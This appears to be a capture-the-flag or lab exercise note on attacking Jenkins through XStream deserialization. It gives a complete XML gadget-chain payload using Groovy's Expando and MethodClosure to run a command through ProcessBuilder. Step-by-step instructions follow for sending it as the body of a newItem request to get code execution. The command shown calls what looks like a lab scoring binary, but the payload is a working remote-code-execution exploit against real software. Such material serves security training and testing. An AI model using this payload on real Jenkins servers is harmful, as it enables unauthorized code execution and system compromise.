https://www.contrastsecurity.com/security-influencers/serialization-must-die-act-2-xstream

Jenkins supports serialised objects based on XStream. Previously, it was possible to get code execution using java.beans.EventHandlerbut it's no longer the case.

Thankfully, Jenkins embeds few third party libraries that include Gadget that can provide an attacker with remote code execution. The payload illustrated in this exercise relies on Groovy:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

<map>
  <entry>
    <groovy.util.Expando>
      <expandoProperties>
        <entry>
          <string>hashCode</string>
          <org.codehaus.groovy.runtime.MethodClosure>
            <delegate class="groovy.util.Expando"/>
            <owner class="java.lang.ProcessBuilder">
              <command>
                <string>/usr/local/bin/score</string>
                <string>2fdb31a2-ca58-4650-abfb-9406be061d69</string>
              </command>
            </owner>
            <method>start</method>
          </org.codehaus.groovy.runtime.MethodClosure>
        </entry>
      </expandoProperties>
    </groovy.util.Expando>
    <int>1</int>
  </entry>
</map>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

* try submitting the same newItem query twice
* since we get an error we will need to change the parameter "name" everytime
* remove the body of the request and replace it with payload
* "name" parameter goes up as a url parameter
* you get an internal server error but your code executes

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~